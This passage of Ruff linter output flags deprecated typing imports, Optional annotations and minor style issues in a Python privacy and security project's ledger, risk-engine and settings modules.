    |                                     ^^^^
962 |         """Get aggregate resource usage"""
963 |         return {
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:973:37
    |
971 |         }
972 |
973 |     def _count_vms_by_type(self) -> Dict[str, int]:
    |                                     ^^^^
974 |         """Count VMs by isolation type"""
975 |         counts = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:981:38
    |
979 |         return counts
980 |
981 |     def _count_vms_by_state(self) -> Dict[str, int]:
    |                                      ^^^^
982 |         """Count VMs by state"""
983 |         counts = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
    --> external\Thirstys-Waterfall\thirstys_waterfall\security\microvm_isolation.py:1011:36
     |
1009 |             self.destroy_vm(vm_id)
1010 |
1011 |     def get_health_status(self) -> Dict[str, Any]:
     |                                    ^^^^
1012 |         """Get overall health status"""
1013 |         healthy_count = 0
     |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:18:1
   |
16 | from enum import Enum
17 | from pathlib import Path
18 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
19 |
20 | from cryptography.fernet import Fernet
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:18:1
   |
16 | from enum import Enum
17 | from pathlib import Path
18 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
19 |
20 | from cryptography.fernet import Fernet
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:18:1
   |
16 | from enum import Enum
17 | from pathlib import Path
18 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
19 |
20 | from cryptography.fernet import Fernet
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:83:15
   |
81 |     action: str = ""
82 |     resource: str = ""
83 |     metadata: Dict[str, Any] = field(default_factory=dict)
   |               ^^^^
84 |     hash: str = ""
85 |     previous_hash: str = ""
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:86:19
   |
84 |     hash: str = ""
85 |     previous_hash: str = ""
86 |     merkle_proof: List[str] = field(default_factory=list)
   |                   ^^^^
87 |     encrypted: bool = False
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:118:26
    |
116 |         return self.hash == self.compute_hash()
117 |
118 |     def to_dict(self) -> Dict[str, Any]:
    |                          ^^^^
119 |         """Convert entry to dictionary"""
120 |         data = asdict(self)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:126:30
    |
125 |     @classmethod
126 |     def from_dict(cls, data: Dict[str, Any]) -> "LedgerEntry":
    |                              ^^^^
127 |         """Create entry from dictionary"""
128 |         # Convert string enums back to enum types
    |
help: Replace with `dict`

SIM101 Multiple `isinstance` calls for expression, merge into a single call
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:131:12
    |
129 |           if isinstance(data.get("event_type"), str):
130 |               data["event_type"] = EventType(data["event_type"])
131 |           if isinstance(data.get("severity"), str) or isinstance(
    |  ____________^
132 | |             data.get("severity"), int
133 | |         ):
    | |_________^
134 |               severity_val = data["severity"]
135 |               data["severity"] = (
    |
help: Merge `isinstance` calls

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:152:22
    |
150 |     def __init__(self):
151 |         self.logger = logging.getLogger(__name__)
152 |         self.leaves: List[str] = []
    |                      ^^^^
153 |         self.tree: List[List[str]] = []
154 |         self.root: Optional[str] = None
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:153:20
    |
151 |         self.logger = logging.getLogger(__name__)
152 |         self.leaves: List[str] = []
153 |         self.tree: List[List[str]] = []
    |                    ^^^^
154 |         self.root: Optional[str] = None
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:153:25
    |
151 |         self.logger = logging.getLogger(__name__)
152 |         self.leaves: List[str] = []
153 |         self.tree: List[List[str]] = []
    |                         ^^^^
154 |         self.root: Optional[str] = None
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:154:20
    |
152 |         self.leaves: List[str] = []
153 |         self.tree: List[List[str]] = []
154 |         self.root: Optional[str] = None
    |                    ^^^^^^^^^^^^^
155 |
156 |     def add_leaf(self, leaf_hash: str):
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:195:45
    |
193 |         self.root = current_layer[0] if current_layer else None
194 |
195 |     def get_proof(self, leaf_index: int) -> List[str]:
    |                                             ^^^^
196 |         """
197 |         Generate Merkle proof for a leaf.
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:232:16
    |
230 |         self,
231 |         leaf_hash: str,
232 |         proof: List[str],
    |                ^^^^
233 |         root: Optional[str] = None,
234 |         leaf_index: Optional[int] = None,
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:233:15
    |
231 |         leaf_hash: str,
232 |         proof: List[str],
233 |         root: Optional[str] = None,
    |               ^^^^^^^^^^^^^
234 |         leaf_index: Optional[int] = None,
235 |     ) -> bool:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:234:21
    |
232 |         proof: List[str],
233 |         root: Optional[str] = None,
234 |         leaf_index: Optional[int] = None,
    |                     ^^^^^^^^^^^^^
235 |     ) -> bool:
236 |         """
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:279:27
    |
277 |         return current_hash == root
278 |
279 |     def get_root(self) -> Optional[str]:
    |                           ^^^^^^^^^^^^^
280 |         """Get current Merkle root"""
281 |         return self.root
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:304:25
    |
302 |         self,
303 |         storage_path: str,
304 |         encryption_key: Optional[bytes] = None,
    |                         ^^^^^^^^^^^^^^^
305 |         max_entries: int = 100000,
306 |         retention_days: int = 90,
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:327:23
    |
326 |         # Ledger state
327 |         self.entries: List[LedgerEntry] = []
    |                       ^^^^
328 |         self.entry_index: Dict[str, LedgerEntry] = {}
329 |         self.user_index: Dict[str, List[str]] = defaultdict(list)
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:328:27
    |
326 |         # Ledger state
327 |         self.entries: List[LedgerEntry] = []
328 |         self.entry_index: Dict[str, LedgerEntry] = {}
    |                           ^^^^
329 |         self.user_index: Dict[str, List[str]] = defaultdict(list)
330 |         self.type_index: Dict[EventType, List[str]] = defaultdict(list)
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:329:26
    |
327 |         self.entries: List[LedgerEntry] = []
328 |         self.entry_index: Dict[str, LedgerEntry] = {}
329 |         self.user_index: Dict[str, List[str]] = defaultdict(list)
    |                          ^^^^
330 |         self.type_index: Dict[EventType, List[str]] = defaultdict(list)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:329:36
    |
327 |         self.entries: List[LedgerEntry] = []
328 |         self.entry_index: Dict[str, LedgerEntry] = {}
329 |         self.user_index: Dict[str, List[str]] = defaultdict(list)
    |                                    ^^^^
330 |         self.type_index: Dict[EventType, List[str]] = defaultdict(list)
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:330:26
    |
328 |         self.entry_index: Dict[str, LedgerEntry] = {}
329 |         self.user_index: Dict[str, List[str]] = defaultdict(list)
330 |         self.type_index: Dict[EventType, List[str]] = defaultdict(list)
    |                          ^^^^
331 |
332 |         # Merkle tree for verification
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:330:42
    |
328 |         self.entry_index: Dict[str, LedgerEntry] = {}
329 |         self.user_index: Dict[str, List[str]] = defaultdict(list)
330 |         self.type_index: Dict[EventType, List[str]] = defaultdict(list)
    |                                          ^^^^
331 |
332 |         # Merkle tree for verification
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:357:49
    |
355 |         )
356 |
357 |     def _setup_encryption(self, encryption_key: Optional[bytes]):
    |                                                 ^^^^^^^^^^^^^^^
358 |         """Setup zero-knowledge encryption"""
359 |         if encryption_key:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:394:19
    |
392 |         resource: str = "",
393 |         severity: SeverityLevel = SeverityLevel.INFO,
394 |         metadata: Optional[Dict[str, Any]] = None,
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^
395 |     ) -> LedgerEntry:
396 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:394:28
    |
392 |         resource: str = "",
393 |         severity: SeverityLevel = SeverityLevel.INFO,
394 |         metadata: Optional[Dict[str, Any]] = None,
    |                            ^^^^
395 |     ) -> LedgerEntry:
396 |         """
    |
help: Replace with `dict`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:488:17
    |
486 |             except Exception as e:
487 |                 self.logger.error(f"Atomic append failed: {e}")
488 |                 raise RuntimeError(f"Failed to append entry atomically: {e}")
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
489 |
490 |     def _serialize_entry(self, entry: LedgerEntry) -> bytes:
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:536:13
    |
534 |         except Exception as e:
535 |             self.logger.error(f"Entry deserialization failed: {e}")
536 |             raise ValueError(f"Failed to deserialize entry: {e}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
537 |
538 |     def _encrypt_field(self, value: str) -> str:
    |

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:567:43
    |
565 |         self.type_index[entry.event_type].append(entry.entry_id)
566 |
567 |     def get_entry(self, entry_id: str) -> Optional[LedgerEntry]:
    |                                           ^^^^^^^^^^^^^^^^^^^^^
568 |         """
569 |         Retrieve entry by ID.
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:582:18
    |
580 |     def search(
581 |         self,
582 |         user_id: Optional[str] = None,
    |                  ^^^^^^^^^^^^^
583 |         event_type: Optional[EventType] = None,
584 |         severity: Optional[SeverityLevel] = None,
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:583:21
    |
581 |         self,
582 |         user_id: Optional[str] = None,
583 |         event_type: Optional[EventType] = None,
    |                     ^^^^^^^^^^^^^^^^^^^
584 |         severity: Optional[SeverityLevel] = None,
585 |         start_time: Optional[float] = None,
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:584:19
    |
582 |         user_id: Optional[str] = None,
583 |         event_type: Optional[EventType] = None,
584 |         severity: Optional[SeverityLevel] = None,
    |                   ^^^^^^^^^^^^^^^^^^^^^^^
585 |         start_time: Optional[float] = None,
586 |         end_time: Optional[float] = None,
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:585:21
    |
583 |         event_type: Optional[EventType] = None,
584 |         severity: Optional[SeverityLevel] = None,
585 |         start_time: Optional[float] = None,
    |                     ^^^^^^^^^^^^^^^
586 |         end_time: Optional[float] = None,
587 |         limit: int = 100,
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:586:19
    |
584 |         severity: Optional[SeverityLevel] = None,
585 |         start_time: Optional[float] = None,
586 |         end_time: Optional[float] = None,
    |                   ^^^^^^^^^^^^^^^
587 |         limit: int = 100,
588 |     ) -> List[LedgerEntry]:
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:588:10
    |
586 |         end_time: Optional[float] = None,
587 |         limit: int = 100,
588 |     ) -> List[LedgerEntry]:
    |          ^^^^
589 |         """
590 |         Search ledger entries with filters.
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:653:41
    |
651 |             return results
652 |
653 |     def verify_chain_integrity(self) -> Tuple[bool, List[str]]:
    |                                         ^^^^^
654 |         """
655 |         Verify integrity of entire ledger chain.
    |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:653:53
    |
651 |             return results
652 |
653 |     def verify_chain_integrity(self) -> Tuple[bool, List[str]]:
    |                                                     ^^^^
654 |         """
655 |         Verify integrity of entire ledger chain.
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:733:47
    |
731 |                 )
732 |
733 |     def _secure_delete_entries(self, entries: List[LedgerEntry]):
    |                                               ^^^^
734 |         """
735 |         Securely delete entries (forensic resistance).
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:853:28
    |
851 |             self.logger.error(f"Failed to load ledger: {e}")
852 |
853 |     def get_stats(self) -> Dict[str, Any]:
    |                            ^^^^
854 |         """Get ledger statistics"""
855 |         with self._lock:
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:881:18
    |
879 |         self,
880 |         output_path: str,
881 |         user_id: Optional[str] = None,
    |                  ^^^^^^^^^^^^^
882 |         start_time: Optional[float] = None,
883 |         end_time: Optional[float] = None,
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:882:21
    |
880 |         output_path: str,
881 |         user_id: Optional[str] = None,
882 |         start_time: Optional[float] = None,
    |                     ^^^^^^^^^^^^^^^
883 |         end_time: Optional[float] = None,
884 |         decrypt_sensitive: bool = False,
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_ledger.py:883:19
    |
881 |         user_id: Optional[str] = None,
882 |         start_time: Optional[float] = None,
883 |         end_time: Optional[float] = None,
    |                   ^^^^^^^^^^^^^^^
884 |         decrypt_sensitive: bool = False,
885 |     ) -> int:
    |
help: Convert to `X | None`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:13:1
   |
11 | from dataclasses import dataclass, field
12 | from enum import Enum
13 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |
help: Import from `collections.abc`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:13:1
   |
11 | from dataclasses import dataclass, field
12 | from enum import Enum
13 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:13:1
   |
11 | from dataclasses import dataclass, field
12 | from enum import Enum
13 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:50:15
   |
48 |     source: str
49 |     description: str
50 |     metadata: Dict[str, Any] = field(default_factory=dict)
   |               ^^^^
51 |     mitigated: bool = False
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:61:22
   |
59 |     normal_data_volume: int = 1024 * 1024  # bytes
60 |     normal_connection_count: int = 10
61 |     trusted_domains: List[str] = field(default_factory=list)
   |                      ^^^^
62 |     typical_session_duration: float = 3600.0  # seconds
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:86:32
   |
84 |     """
85 |
86 |     def __init__(self, config: Optional[Dict[str, Any]] = None):
   |                                ^^^^^^^^^^^^^^^^^^^^^^^^
87 |         self.logger = logging.getLogger(__name__)
88 |         self.config = config or {}
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:86:41
   |
84 |     """
85 |
86 |     def __init__(self, config: Optional[Dict[str, Any]] = None):
   |                                         ^^^^
87 |         self.logger = logging.getLogger(__name__)
88 |         self.config = config or {}
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:105:37
    |
104 |         # Escalation callbacks
105 |         self._escalation_callbacks: Dict[RiskLevel, List[Callable]] = {
    |                                     ^^^^
106 |             level: [] for level in RiskLevel
107 |         }
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:105:53
    |
104 |         # Escalation callbacks
105 |         self._escalation_callbacks: Dict[RiskLevel, List[Callable]] = {
    |                                                     ^^^^
106 |             level: [] for level in RiskLevel
107 |         }
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:141:36
    |
139 |             self._monitor_thread.join(timeout=5.0)
140 |
141 |     def _initialize_model(self) -> Dict[str, float]:
    |                                    ^^^^
142 |         """Initialize AI model weights for threat detection"""
143 |         # Simplified model - in production would load trained ML model
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:167:68
    |
165 |                 self.logger.error(f"Error in monitoring loop: {e}")
166 |
167 |     def report_event(self, event_type: str, source: str, metadata: Dict[str, Any]):
    |                                                                    ^^^^
168 |         """
169 |         Report an event for risk analysis.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:197:55
    |
196 |     def _classify_event(
197 |         self, event_type: str, source: str, metadata: Dict[str, Any]
    |                                                       ^^^^
198 |     ) -> Optional[ThreatEvent]:
199 |         """Classify event as potential threat using AI model"""
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:198:10
    |
196 |     def _classify_event(
197 |         self, event_type: str, source: str, metadata: Dict[str, Any]
198 |     ) -> Optional[ThreatEvent]:
    |          ^^^^^^^^^^^^^^^^^^^^^
199 |         """Classify event as potential threat using AI model"""
    |
help: Convert to `X | None`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:202:9
    |
201 |           # Check for known threat patterns
202 | /         if event_type == "auth_failure":
203 | |             if self._metrics["failed_auth_attempts"] > 5:
    | |_________________________________________________________^
204 |                   return ThreatEvent(
205 |                       timestamp=time.time(),
    |
help: Combine `if` statements using `and`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:433:37
    |
431 |         return self._current_risk_level
432 |
433 |     def get_threat_summary(self) -> Dict[str, Any]:
    |                                     ^^^^
434 |         """Get summary of recent threats"""
435 |         with self._lock:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:454:38
    |
452 |             }
453 |
454 |     def get_detailed_status(self) -> Dict[str, Any]:
    |                                      ^^^^
455 |         """Get detailed risk engine status"""
456 |         with self._lock:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\privacy_risk_engine.py:486:42
    |
485 |     def learn_from_event(
486 |         self, event_type: str, metadata: Dict[str, Any], is_threat: bool
    |                                          ^^^^
487 |     ):
488 |         """
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\settings\contact_system.py:7:1
  |
5 | import logging
6 | import time
7 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\settings\contact_system.py:7:1
  |
5 | import logging
6 | import time
7 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\settings\contact_system.py:17:23
   |
15 |         self.god_tier_encryption = god_tier_encryption
16 |
17 |         self.threads: Dict[str, List[Dict[str, Any]]] = {
   |                       ^^^^
18 |             "improvements": [],
19 |             "features": [],
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\settings\contact_system.py:17:33
   |
15 |         self.god_tier_encryption = god_tier_encryption
16 |
17 |         self.threads: Dict[str, List[Dict[str, Any]]] = {
   |                                 ^^^^
18 |             "improvements": [],
19 |             "features": [],
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\settings\contact_system.py:17:38
   |
15 |         self.god_tier_encryption = god_tier_encryption
16 |
17 |         self.threads: Dict[str, List[Dict[str, Any]]] = {
   |                                      ^^^^
18 |             "improvements": [],
19 |             "features": [],
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\settings\contact_system.py:24:58
   |
22 |         }
23 |
24 |     def send_message(self, thread: str, message: str) -> Dict[str, Any]:
   |                                                          ^^^^
25 |         """Send a message (encrypted)"""
26 |         if thread not in self.threads:
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\settings\contact_system.py:41:42
   |
39 |         return {"status": "sent", "id": msg["id"], "thread": thread}
40 |
41 |     def get_thread(self, thread: str) -> List[Dict[str, Any]]:
   |                                          ^^^^
42 |         """Get messages in a thread"""
43 |         return self.threads.get(thread, []).copy()
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\settings\contact_system.py:41:47
   |
39 |         return {"status": "sent", "id": msg["id"], "thread": thread}
40 |
41 |     def get_thread(self, thread: str) -> List[Dict[str, Any]]:
   |                                               ^^^^
42 |         """Get messages in a thread"""
43 |         return self.threads.get(thread, []).copy()
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\settings\feedback_manager.py:7:1
  |
5 | import logging
6 | import time
7 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\settings\feedback_manager.py:7:1
  |
5 | import logging
6 | import time
7 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\settings\feedback_manager.py:16:24
   |
14 |         self.logger = logging.getLogger(__name__)
15 |         self.god_tier_encryption = god_tier_encryption
16 |         self.feedback: List[Dict[str, Any]] = []
   |                        ^^^^
17 |
18 |         self.feedback_types = {
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\settings\feedback_manager.py:16:29
   |
14 |         self.logger = logging.getLogger(__name__)
15 |         self.god_tier_encryption = god_tier_encryption
16 |         self.feedback: List[Dict[str, Any]] = []
   |                             ^^^^
17 |
18 |         self.feedback_types = {
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\settings\feedback_manager.py:26:10
   |
24 |     def submit_feedback(
25 |         self, feedback_type: str, title: str, description: str
26 |     ) -> Dict[str, Any]:
   |          ^^^^
27 |         """Submit feedback (encrypted)"""
28 |         encrypted_title = self.god_tier_encryption.encrypt_god_tier(title.encode())
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\settings\qa_system.py:7:1
  |
5 | import logging
6 | import time
7 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\settings\qa_system.py:7:1
  |
5 | import logging
6 | import time
7 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\settings\qa_system.py:38:30
   |
36 |         ]
37 |
38 |         self.user_questions: List[Dict[str, Any]] = []
   |                              ^^^^
39 |
40 |     def search(self, query: str) -> List[Dict[str, Any]]:
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\settings\qa_system.py:38:35
   |
36 |         ]
37 |
38 |         self.user_questions: List[Dict[str, Any]] = []
   |                                   ^^^^
39 |
40 |     def search(self, query: str) -> List[Dict[str, Any]]:
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\settings\qa_system.py:40:37
   |
38 |         self.user_questions: List[Dict[str, Any]] = []
39 |
40 |     def search(self, query: str) -> List[Dict[str, Any]]:
   |                                     ^^^^
41 |         """Search Q/A database"""
42 |         query_lower = query.lower()
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\settings\qa_system.py:40:42
   |
38 |         self.user_questions: List[Dict[str, Any]] = []
39 |
40 |     def search(self, query: str) -> List[Dict[str, Any]]:
   |                                          ^^^^
41 |         """Search Q/A database"""
42 |         query_lower = query.lower()
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
